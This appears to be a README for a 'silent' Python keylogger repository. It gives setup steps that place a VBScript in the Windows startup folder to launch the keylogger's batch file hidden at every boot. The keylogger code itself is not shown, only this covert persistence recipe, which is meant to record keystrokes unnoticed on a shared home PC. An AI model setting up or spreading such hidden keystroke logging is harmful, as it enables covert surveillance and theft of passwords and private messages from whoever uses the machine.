# Python silent keylogger

Little python script to put on your home pc. Killed when 'esc' key is pressed.

# Setup guide

  - 1- download this repository where you want to settle the code.
  - 2- Once downloaded, run "shell:startup", and there create a file with the content below (name it run.vbs):
  - ``` 
    Set oShell = CreateObject ("Wscript.Shell") 
    Dim strArgs
    strArgs = "cmd /c C:\PATH_TO_THE_BATFILE\run_pyth.bat"
    oShell.Run strArgs, 0, false
    ```

## reboot and you are done! :)
thanks!